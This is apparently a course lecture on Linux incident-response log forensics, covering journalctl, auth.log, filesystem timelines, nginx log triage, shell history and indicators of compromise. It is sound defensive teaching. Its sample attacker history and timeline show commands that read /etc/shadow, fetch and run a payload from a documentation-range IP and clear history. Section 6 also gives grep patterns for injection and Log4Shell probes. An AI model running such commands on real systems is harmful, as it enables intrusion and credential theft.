# Lecture 2 — Linux Log Forensics

> *Lecture 1 left the analyst at T+30:00, having opened the incident log and handed off (or continued as) the primary. Lecture 2 picks up at T+31:00 and walks the analyst's screen for the next several hours: which logs to open, what to grep for, how to read the output, how to assemble those reads into a defensible timeline. The audience is a learner who has used `grep` and `tail -f` before but has never used them under the time pressure and the evidentiary discipline of a real incident response.*

---

## 1. The Linux log landscape in 2026

Almost every Linux distribution shipped in 2026 uses **systemd** as the init system, and therefore uses **`systemd-journald`** as the primary logging daemon. The journal is the unified, binary, indexed log that the analyst reads with `journalctl`. The journal supersedes the older `/var/log/*.log` text files for everything systemd controls — which is almost everything.

That said, most distributions *also* run **`rsyslog`** alongside the journal, and `rsyslog` writes the traditional text files into `/var/log/`. The text files exist for two reasons: backward compatibility with the universe of log-processing tools that grew up on syslog text format, and the operator's preference for `grep` over `journalctl`. The analyst should be fluent in both.

A typical Ubuntu 24.04 LTS host has, simultaneously:

- `/var/log/journal/<machine-id>/system.journal` — the binary journal. Read with `journalctl`.
- `/var/log/auth.log` — authentication events (PAM, SSH, sudo). Plain text, line-per-event.
- `/var/log/syslog` — general system events. Plain text.
- `/var/log/kern.log` — kernel ring buffer dump. Plain text.
- `/var/log/dpkg.log` — package installations and removals. Plain text.
- `/var/log/wtmp` — login history. Binary, read with `last`.
- `/var/log/btmp` — failed-login history. Binary, read with `lastb`.
- `/var/log/utmp` — currently-logged-in users. Binary, read with `who` and `w`.
- `/var/log/nginx/access.log` and `/error.log` — web-server logs. Plain text.
- `/var/log/apt/history.log` — APT transaction history. Plain text.
- `/var/log/audit/audit.log` — `auditd` events, if `auditd` is configured (off by default on most distros). Plain text.
- `~/.bash_history`, `~/.zsh_history` — per-user shell history. Plain text; trivial for an intruder to clear.

A RHEL-family host (RHEL, Fedora, Rocky, Alma) has the same journal plus a slightly different rsyslog layout: `/var/log/secure` instead of `auth.log`, `/var/log/messages` instead of `syslog`.

The mini-project's starter directory contains realistic samples of each, dated within a single week, with a coherent attacker timeline running through them.

---

## 2. `journalctl` — the canonical Linux log reader

The journal is binary. You cannot `grep` the journal directly. You read it through `journalctl`. The man page is at <https://man7.org/linux/man-pages/man1/journalctl.1.html>; read it once in full.

### 2.1 The flags that matter under pressure

```bash
# All entries, most recent last, plain text.
journalctl --no-pager

# Restrict by time. ISO 8601 is the universal language.
journalctl --since "2026-05-14 02:00:00" --until "2026-05-14 05:00:00"

# Restrict by systemd unit (service). The single most useful filter.
journalctl -u ssh.service
journalctl -u nginx.service

# Output format. short-iso prints ISO 8601 timestamps; json is for downstream parsing.
journalctl -o short-iso --no-pager
journalctl -o json --no-pager > /tmp/journal.jsonl

# Boot scope. -b is current boot; -b -1 is the previous boot.
journalctl -b
journalctl -b -1

# Verbose explanations of catalogued messages.
journalctl -x

# Kernel ring buffer only.
journalctl -k
```

The `--no-pager` flag is non-negotiable for forensic work. Without it, `journalctl` invokes `less`, which paginates output and makes shell-piping into other tools (`grep`, `awk`, `wc`) misbehave when the terminal is non-interactive.

### 2.2 Three queries every analyst types within the first hour

These three queries answer the three first-hour questions: *who logged in*, *what services restarted*, *what errors fired*.

```bash
# Question 1: who logged in in the last 24 hours via SSH?
journalctl -u ssh.service --since "24 hours ago" -o short-iso --no-pager

# Question 2: which services restarted unexpectedly in the last 24 hours?
journalctl --since "24 hours ago" --no-pager | grep -E "Started|Stopped|Failed"

# Question 3: what messages tagged "error" or "warning" or "critical" fired?
journalctl -p err --since "24 hours ago" --no-pager
# (-p err shows priority 3=error and below. -p warning includes priority 4 too.)
```

The output of those three queries will, for many small environments, surface the entire incident on the first page. The output for the lab in the mini-project is comparable; the second-and-third pages of `journalctl -u ssh.service` for the simulated compromise are the canonical "find the foothold" view.

### 2.3 Filtering on fields (the underused power)

Every journal entry has a structured field set, not just a message text. The most useful fields for IR:

- `_PID` — process ID that emitted the message.
- `_UID` — UID of the process.
- `_COMM` — process name.
- `_EXE` — executable path.
- `_CMDLINE` — full command line.
- `_HOSTNAME` — host that emitted the message.
- `PRIORITY` — syslog priority (0=emerg, 7=debug).
- `SYSLOG_IDENTIFIER` — the rsyslog-compatible program name.
- `UNIT` — the systemd unit.

You filter on a field by appending `FIELD=VALUE`:

```bash
# Every message emitted by a process running as UID 0 in the last hour.
journalctl _UID=0 --since "1 hour ago" --no-pager

# Every message emitted by a process named "sshd".
journalctl _COMM=sshd --no-pager

# Every message emitted by a particular PID (useful when chasing a known-bad process).
journalctl _PID=8421 --no-pager

# JSON output makes downstream parsing trivial.
journalctl _COMM=sshd -o json --no-pager | jq '.MESSAGE'
```

The lab exercises and the mini-project use these filters extensively. Practice each one against your own laptop's journal before you sit down to the mini-project.

### 2.4 What `journalctl` cannot do

The journal contains only what `systemd-journald` was told about. If `rsyslog` is configured to write a particular event to `/var/log/auth.log` but *not* forward it to the journal, the event is in the text file and *not* in the journal. The intersection of "what is in the journal" and "what is in `/var/log/auth.log`" depends on the distribution and the configuration. The safe assumption: read both.

Also: the journal is rotated (the default `SystemMaxUse` on Ubuntu 24.04 is roughly 10% of the filesystem). An attacker who is on the host long enough may end up rotating out their own footprint. Long-retention logs require either a remote syslog target, a SIEM, or a configured `SystemMaxUse` that buys multiple weeks of retention. Confirm the retention period on every host you investigate.

---

## 3. `/var/log/auth.log` and friends

When the journal is silent or incomplete, the authoritative authentication log is `auth.log` (Debian/Ubuntu) or `secure` (RHEL/Fedora). This is the text file that records every PAM event, every SSH login attempt, every sudo invocation.

### 3.1 The shape of a line

A line in `auth.log` looks like this:

```text
May 14 02:47:11 web-prod-02 sshd[8421]: Accepted publickey for deploy from 198.51.100.7 port 49152 ssh2: RSA SHA256:...
May 14 02:47:11 web-prod-02 sshd[8421]: pam_unix(sshd:session): session opened for user deploy(uid=1003) by (uid=0)
May 14 02:47:32 web-prod-02 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash
May 14 02:47:32 web-prod-02 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by deploy(uid=1003)
```

Five fields per line by `rsyslog` default: short timestamp (no year, no timezone — the canonical pitfall, addressed in § 3.4 below), hostname, program name and PID, message. The fifth field is the message; everything in the message is program-specific text.

### 3.2 Searching `auth.log` under pressure

```bash
# Every SSH login attempt against the host.
grep -E "sshd\[[0-9]+\]:" /var/log/auth.log

# Every successful SSH publickey login.
grep "Accepted publickey" /var/log/auth.log

# Every failed SSH login.
grep "Failed password\|Invalid user" /var/log/auth.log

# Every sudo invocation. The single most useful filter for post-foothold analysis.
grep "sudo:" /var/log/auth.log

# Sudo invocations where the target was root and the user was someone non-admin.
grep "sudo:" /var/log/auth.log | grep "USER=root" | grep -v "deploy\|ops\|admin"

# Rate of failed logins per minute — the canonical brute-force signature.
grep "Failed password" /var/log/auth.log | awk '{print $1, $2, $3}' | cut -d: -f1,2 | sort | uniq -c
```

The last query is the one to memorise. Brute-force attempts produce a tall, narrow histogram: many failures in a small window. Legitimate users produce occasional ones and twos. The histogram is the signature.

### 3.3 Cross-checking with `lastb` and `last`

`lastb` reads `/var/log/btmp` and prints failed logins as a clean table; `last` reads `/var/log/wtmp` and prints successful logins. Both are easier to read than `grep`'ing the text logs and surface the same information.

```bash
# Every failed login attempt against the host.
sudo lastb

# Every successful login.
last

# Last login per user (the "who logged in recently" overview).
last -aiF | head -50
# -a puts the source IP last (more grep-friendly).
# -i forces numeric IPs (no DNS).
# -F prints full login and logout times in the long form.

# Limit to a particular user.
last deploy

# Limit by time. -s and -t set start and end.
last -s yesterday -t today
```

`last` and `lastb` are exhibits in the lab. Read them first, then go to the text logs for context.

### 3.4 The timestamp gotcha

The default `rsyslog` format does not include the year or the timezone. A line that reads `May 14 02:47:11 ...` is a line for *the most recent May 14 the file has rolled through*. If the file has been rotated, the date might be from last year and `rsyslog` will not tell you. The defence: always check `/etc/logrotate.d/rsyslog` for the rotation policy, and always corroborate `auth.log` timestamps against the journal, which is timezone-aware and year-aware.

In 2026 most distributions ship `rsyslog` with the `RSYSLOG_TraditionalFileFormat` deprecated in favour of `RSYSLOG_FileFormat`, which includes the year and the timezone. Check `/etc/rsyslog.conf` for the active template before you start reading.

---

## 4. `who`, `w`, `last`, `lastb` — the four-line answer to "who is on this host right now"

```bash
# Currently-logged-in users.
who

# Currently-logged-in users with what they are doing right now.
w

# Login history (successful).
last

# Login history (failed).
sudo lastb
```

`who` and `w` read `/var/log/utmp`. `last` and `lastb` read `wtmp` and `btmp`. All four are unaware of any session that did not go through PAM (a SUID binary that grants a shell without PAM, for instance, would not appear in utmp/wtmp). All four are also writable by root (an attacker with root can edit wtmp to remove their entries; the canonical attacker tool `utmpdump` is bundled in `util-linux` and round-trips the file as text). Treat the output as evidence, not as gospel; corroborate against the journal.

The lab's `wtmp` and `btmp` are pre-rolled into the starter directory along with sample outputs from each command.

---

## 5. Filesystem timeline with `find -newer`, `stat`, and `mtime`/`ctime`/`atime`

The filesystem holds the second-deepest record of what happened on the host. Files modified, files created, directories whose mtime updated when their contents changed — all of it is timestamped, and most of it is recoverable.

### 5.1 Stat output (read this slowly)

```bash
$ stat /etc/passwd
  File: /etc/passwd
  Size: 2942        Blocks: 8          IO Block: 4096   regular file
Device: 803h/2051d  Inode: 1310741     Links: 1
Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2026-05-14 02:47:33.000000000 +0000
Modify: 2026-05-13 22:01:11.000000000 +0000
Change: 2026-05-13 22:01:11.000000000 +0000
 Birth: 2024-08-15 09:00:01.000000000 +0000
```

Four timestamps:

- **Access (atime).** When the file was last read. Often unreliable in 2026 because most filesystems mount with `relatime` (atime only updated if it is older than mtime/ctime, or older than 24 hours) or `noatime` (atime never updated). Check the mount options before you draw a conclusion from atime.
- **Modify (mtime).** When the file's *contents* were last modified.
- **Change (ctime).** When the inode metadata last changed (permissions, ownership, link count). Updated when the file is touched in any way; cannot be set by `touch` alone (an attacker has to manipulate the inode directly, e.g. with `debugfs`, to forge ctime).
- **Birth.** When the inode was allocated. ext4 records it; most older filesystems do not.

`ctime` is the analyst's friend: it tracks inode metadata changes that the routine `touch -d` attack does not forge. An attacker who runs `touch -d "2024-01-01" /tmp/payload` rewrites mtime and atime but leaves ctime pointing at *the moment they ran touch*. The mismatch (mtime far before ctime) is itself an indicator.

### 5.2 Building a timeline with `find`

```bash
# Every file modified in the last 24 hours, sorted by mtime.
find / -xdev -type f -mtime -1 -printf '%T+ %p\n' 2>/dev/null | sort

# Every file changed (ctime) in the last 24 hours.
find / -xdev -type f -ctime -1 -printf '%C+ %p\n' 2>/dev/null | sort

# Every file modified between a reference file's mtime and now.
touch -d "2026-05-14 02:00:00" /tmp/ref
find / -xdev -type f -newer /tmp/ref 2>/dev/null | sort

# Every file under /etc whose mtime is more recent than ctime (forgery signature).
find /etc -type f -printf '%T@ %C@ %p\n' 2>/dev/null \
  | awk '$1 < $2 { print }'

# Every file under /tmp, /var/tmp, /dev/shm — the canonical scratch directories
# for attacker staging.
find /tmp /var/tmp /dev/shm -type f -printf '%T+ %p\n' 2>/dev/null | sort
```

The `-xdev` flag stops `find` at the filesystem boundary, which is what you usually want (you do not want to walk into `/proc` or `/sys` or the host's NFS mounts). `2>/dev/null` suppresses the "permission denied" noise when `find` walks into root-owned directories from a non-root shell.

The output of these queries is the substance of the timeline reconstruction in Exercise 3 of this week.

### 5.3 Cross-validating with `ls -lc`, `ls -lu`, `ls -lt`

```bash
ls -lt /tmp    # by mtime (modification)
ls -lc /tmp    # by ctime (inode change)
ls -lu /tmp    # by atime (access)
```

Use all three when investigating a directory of suspected attacker scratch space. Inconsistencies between the three orderings (mtime not matching ctime, for instance) are themselves indicators.

---

## 6. Web-server log triage (`nginx` `combined` format)

`nginx`'s default `access.log` format, `combined`, is:

```text
$remote_addr - $remote_user [$time_local] "$request" $status $body_bytes_sent "$http_referer" "$http_user_agent"
```

Example line:

```text
198.51.100.7 - - [14/May/2026:02:47:11 +0000] "GET /admin/login.php HTTP/1.1" 404 162 "-" "Mozilla/5.0 zgrab/0.x"
```

Eight fields, all positionally parseable. The User-Agent and the requested URL are the two highest-signal fields for IR triage.

### 6.1 Scanner User-Agent signatures

Every automated scanner stamps its User-Agent unless the operator explicitly overrode it (and most do not). The User-Agent line is the cheapest detection on Earth.

| Tool             | Default User-Agent fragment                  |
|------------------|----------------------------------------------|
| `nmap` (http-enum) | `Mozilla/5.0 (compatible; Nmap Scripting Engine; ...)` |
| `nikto`            | `Mozilla/5.00 (Nikto/2.X.X)`                |
| `sqlmap`           | `sqlmap/1.X.X`                              |
| `dirbuster`        | `DirBuster-1.0-RC1`                         |
| `gobuster`         | `gobuster/3.X.X`                            |
| `wpscan`           | `WPScan v3.X.X`                             |
| `zgrab`            | `Mozilla/5.0 zgrab/0.x`                     |
| `masscan` (-http)  | `masscan/1.X` (rare, masscan does not HTTP) |
| `feroxbuster`      | `feroxbuster/2.X.X`                         |
| `curl` (default)   | `curl/8.X.X`                                |

```bash
# Find every request from a scanner with a default User-Agent.
grep -E "Nikto|sqlmap|nmap|DirBuster|gobuster|WPScan|zgrab|feroxbuster" \
  /var/log/nginx/access.log

# Rank User-Agents by hit count. A scanner usually appears at the top.
awk -F'"' '{print $6}' /var/log/nginx/access.log | sort | uniq -c | sort -rn | head -30
```

A custom User-Agent (or a blank one) is itself a signal: legitimate traffic almost never has an empty UA. The empty-or-near-empty UA filter:

```bash
awk -F'"' '$6 == "" || $6 == "-" {print}' /var/log/nginx/access.log
```

### 6.2 URL-path signatures of exploitation

```bash
# SQL injection probes.
grep -iE "(union[+ ]select|or[+ ]1=1|'\s*or\s*'|sleep\(|benchmark\()" \
  /var/log/nginx/access.log

# Path traversal probes.
grep -E "\.\./|\.\.\\\\|%2e%2e" /var/log/nginx/access.log

# Command-injection probes.
grep -E ";.+cat |;.+wget |;.+curl |;.+id;|%3b" /var/log/nginx/access.log

# Log4Shell (December 2021).
grep "jndi:ldap\|jndi:rmi\|jndi:dns" /var/log/nginx/access.log

# .env / .git / .ssh probing.
grep -E "/\.env|/\.git/|/\.ssh/|/\.aws/" /var/log/nginx/access.log

# WordPress brute-force endpoints.
grep -E "/wp-login\.php|/xmlrpc\.php" /var/log/nginx/access.log

# Common admin-panel discovery.
grep -E "/admin|/administrator|/phpmyadmin|/manager/html|/console" \
  /var/log/nginx/access.log
```

Run each against the lab's `nginx` access log in Exercise 2. The script you write in Exercise 2 will produce a ranked report of every family hit.

### 6.3 Status-code patterns

A volume of `404`s in a short window from a single source is the canonical *discovery scan* signature. A volume of `401`/`403` against the same path is the canonical *credential stuff* signature. A `200` immediately after a long run of `404`s suggests the scanner found something. A `500` is application-side noise but is sometimes the first sign of a successful injection that broke the application.

```bash
# 404 rate per source IP per minute.
awk '$9 == 404 {print substr($4, 2, 17), $1}' /var/log/nginx/access.log \
  | sort | uniq -c | sort -rn | head -30

# 401/403 rate per source IP per minute.
awk '$9 == 401 || $9 == 403 {print substr($4, 2, 17), $1}' \
  /var/log/nginx/access.log | sort | uniq -c | sort -rn | head -30

# 500-class noise rank.
awk '$9 >= 500 {print $1, $9, $7}' /var/log/nginx/access.log \
  | sort | uniq -c | sort -rn | head -30
```

The lab contains all three patterns. Exercise 2 surfaces each.

---

## 7. Shell-history files (`~/.bash_history`, `~/.zsh_history`)

Every interactive shell, by default, writes the user's command history to a file in their home directory. The files are plain text, readable, and the most legible record of what an interactive user typed — *if* the user has not cleared them.

### 7.1 What `bash_history` records and what it does not

- Records: commands typed at the prompt, one per line, in the order they were committed (which, by default, is on shell exit, not on command run).
- Does not record: timestamps (unless `HISTTIMEFORMAT` is set), the directory the command was run in, whether the command succeeded, whether the user piped output anywhere, what was in environment variables at the time of the run.

A line in `bash_history`:

```text
ls -la /etc
sudo cat /etc/shadow
wget http://198.51.100.7/payload -O /tmp/x
chmod +x /tmp/x
/tmp/x
history -c
exit
```

`history -c` clears the in-memory history; if it runs *before* the shell writes the file on exit, the file ends up empty. An attacker who `rm`s the file outright is even more direct. The mature interactive-monitoring setup (`auditd` rules, or shipping every shell command to a remote log) does not depend on `bash_history`; in the lab, however, the attacker did *not* clear, so the file is recoverable. The lab's `bash_history` is one of the more legible artefacts.

### 7.2 Timestamps via `HISTTIMEFORMAT`

If the user's shell had `HISTTIMEFORMAT` set (`export HISTTIMEFORMAT="%F %T "`), each line in `bash_history` is preceded by a `#<unix-timestamp>` line:

```text
#1715662031
ls -la /etc
#1715662045
sudo cat /etc/shadow
```

This is the better default for any host you administer. Set it in `/etc/profile.d/`.

### 7.3 Recovering history from a wiped file via Volatility 3

If the attacker cleared `~/.bash_history` but the shell process is still running (or a memory image was captured while it was), the **`linux.bash`** Volatility 3 plugin can reconstruct the in-memory history from the shell's heap. This is one of the principal reasons memory acquisition is in the order-of-volatility list above disk acquisition. The lab's mini-project includes a tiny memory snippet whose bash history can be recovered this way.

---

## 8. Windows event-log basics — conceptual only

This is a Linux course. Windows event-log triage is a substantial topic in its own right, owed to a future module. Three things you should know now:

1. **The Windows Security log** records authentication events, privilege use, audit-policy changes, and similar. The standard event IDs (4624 successful logon, 4625 failed logon, 4672 special privileges, 4720 user-account creation) are the Windows analogue of `/var/log/auth.log`.
2. **Sysmon** (the System Monitor service, from Microsoft Sysinternals — <https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon>) augments the Security log with high-volume, high-signal events: every process creation, every network connection, every image loaded, every file created. Sysmon is not installed by default; the IR team installs it as part of preparation.
3. The four Sysmon event IDs worth memorising:
   - **Event 1 — Process Creation.** The single most-cited Sysmon event. Records the full command line, the parent process, the image path, and the file hash. The basis for catching almost every Living-Off-The-Land technique.
   - **Event 3 — Network Connection.** Every outbound (and optionally inbound) connection by every process. The basis for catching C2 traffic.
   - **Event 7 — Image Loaded.** Every DLL loaded into a process. The basis for catching DLL side-loading and DLL injection.
   - **Event 11 — File Created.** Every file created on disk. The basis for catching dropped payloads.

If you investigate a Windows host one day, your starting points are: `wevtutil epl Security ...` (export the Security log), the Sysmon configuration's filter to see what is recorded, and the SwiftOnSecurity sample Sysmon config at <https://github.com/SwiftOnSecurity/sysmon-config> as the reference for what a sane Sysmon configuration looks like. Beyond that, owed to a Windows course.

---

## 9. Assembling the timeline

The timeline is one chronologically-sorted list of every observed event, with timestamps in ISO 8601 UTC, with the source of each event labelled, and with a one-line description of each. The timeline is the substance of the post-incident report.

A snippet of the lab's timeline (the full version is built in Exercise 3):

```text
2026-05-14T02:46:32Z  nginx-access  198.51.100.7  GET /admin/login.php  404
2026-05-14T02:46:33Z  nginx-access  198.51.100.7  GET /administrator    404
2026-05-14T02:46:34Z  nginx-access  198.51.100.7  GET /phpmyadmin       404
2026-05-14T02:46:35Z  nginx-access  198.51.100.7  GET /.env             404
2026-05-14T02:46:36Z  nginx-access  198.51.100.7  GET /.git/HEAD        200  <-- 1st hit
2026-05-14T02:46:55Z  nginx-access  198.51.100.7  GET /.git/config      200
2026-05-14T02:47:11Z  auth.log     sshd[8421]  Accepted publickey for deploy from 198.51.100.7
2026-05-14T02:47:11Z  auth.log     sshd[8421]  session opened for user deploy(uid=1003) by (uid=0)
2026-05-14T02:47:32Z  auth.log     sudo  deploy: COMMAND=/bin/bash  ->  USER=root
2026-05-14T02:47:33Z  fs-mtime     /tmp/.x  (size 4214232, sha256:abc...)
2026-05-14T02:47:34Z  bash-history deploy  wget http://198.51.100.7/payload -O /tmp/x
2026-05-14T02:47:35Z  bash-history deploy  chmod +x /tmp/x
2026-05-14T02:47:35Z  bash-history deploy  /tmp/x
2026-05-14T02:47:36Z  journal       systemd[1]  Started session-7.scope - Session 7 of user deploy.
...
```

The Python script `exercises/exercise-03-timeline-builder.py` ingests heterogeneous source files (journal JSON, auth.log text, nginx access.log, bash_history with HISTTIMEFORMAT) and produces a single ISO 8601 UTC-sorted timeline as Markdown. The mini-project requires you to extend the script to ingest the lab's specific log layout.

---

## 10. Indicators of compromise (IOCs)

Indicators of compromise are the artefacts that identify the threat. In the lab the IOCs you will recover include:

- The attacker source IP: `198.51.100.7` (this is part of the TEST-NET-2 documentation range, RFC 5737).
- The dropped payload's SHA-256.
- The path the payload was staged at: `/tmp/.x`.
- The cron entry the attacker added.
- The systemd unit file the attacker dropped.
- The new user account the attacker created.
- The egress destination the payload called out to.

Each IOC has a type, a value, a first-seen timestamp, a last-seen timestamp, and a confidence level. The mini-project requires you to produce a JSON export of these in a STIX-flavoured shape.

---

## 11. What to read before Lecture 3

- The `journalctl(1)` man page in full.
- The `find(1)` and `stat(1)` man pages in full.
- The MITRE ATT&CK *Discovery* and *Credential Access* tactic pages at <https://attack.mitre.org/tactics/TA0007/> and <https://attack.mitre.org/tactics/TA0006/>.
- **RFC 3227** (order of volatility) in full. Short, important.

Lecture 3 picks up at the memory-acquisition decision and walks the chain-of-custody discipline.

---

*Continue to [Lecture 3 — Memory Acquisition and Chain of Custody](./03-memory-acquisition-and-chain-of-custody.md).*
